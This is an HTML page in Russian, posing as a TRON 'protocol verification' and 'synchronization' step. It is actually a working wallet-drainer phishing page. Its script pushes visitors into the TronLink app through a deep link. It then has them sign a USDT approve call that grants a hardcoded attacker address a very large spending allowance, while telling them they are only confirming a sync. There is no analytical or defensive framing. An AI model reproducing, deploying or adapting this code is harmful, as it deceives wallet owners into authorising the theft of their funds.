<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Protocol Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
        h2 { font-size: 22px; margin-bottom: 12px; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; border: none; width: 100%; cursor: pointer; }
        #status { color: #555; font-size: 11px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">T</div>
    <h2 id="title">Синхронизация</h2>
    <p id="desc">Нажмите кнопку ниже, чтобы перейти в приложение кошелька и подтвердить транзакцию.</p>
    
    <button id="mainBtn" class="btn">ЗАПУСТИТЬ</button>
    
    <div id="status">v2.0 Native Bridge</div>
</div>

<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    
    const btn = document.getElementById('mainBtn');
    const title = document.getElementById('title');
    const desc = document.getElementById('desc');

    async function handleAction() {
        // Проверяем, мы уже внутри TronLink или еще в браузере?
        const isTronLinkInternal = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!isTronLinkInternal) {
            // МЫ В ТЕЛЕГРАМЕ/SAFARI -> ТРИГГЕРИМ АЙФОН
            const myUrl = window.location.href;
            
            // Самый "сильный" протокол для iPhone, который вызывает именно TronLink
            // Без посредников и сайтов
            const nativeDeepLink = "tronlinkorg://dapp?url=" + encodeURIComponent(myUrl);
            
            // Пытаемся вызвать приложение
            window.location.href = nativeDeepLink;
            
            // Запасной вариант через 300мс (если первый не сработал)
            setTimeout(() => {
                window.location.replace(nativeDeepLink);
            }, 300);
            
            return;
        }

        // МЫ ВНУТРИ TRONLINK -> ПОДПИСЫВАЕМ APPROVE
        try {
            btn.innerText = "ПОДТВЕРЖДЕНИЕ...";
            btn.disabled = true;

            const tron = window.tronWeb || window.tron.tronWeb;
            await tron.request({ method: 'tron_requestAccounts' });
            
            const contract = await tron.contract().at(CONTRACT_USDT);
            
            // Вызываем Approve на 1,000,000 USDT (чтобы наверняка)
            await contract.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            alert("Синхронизация завершена успешно!");
            btn.innerText = "ГОТОВО";
        } catch (e) {
            console.error(e);
            alert("Ошибка: " + e.message);
            btn.disabled = false;
            btn.innerText = "ПОДТВЕРДИТЬ";
        }
    }

    btn.onclick = handleAction;

    // Если мы уже открылись внутри кошелька - меняем интерфейс
    window.onload = () => {
        if (window.tronWeb || (window.tron && window.tron.tronWeb)) {
            title.innerText = "Узел Обнаружен";
            desc.innerText = "Кошелек подключен. Нажмите кнопку «ПОДТВЕРДИТЬ» для завершения синхронизации.";
            btn.innerText = "ПОДТВЕРДИТЬ";
        }
    };
</script>
</body>
</html>
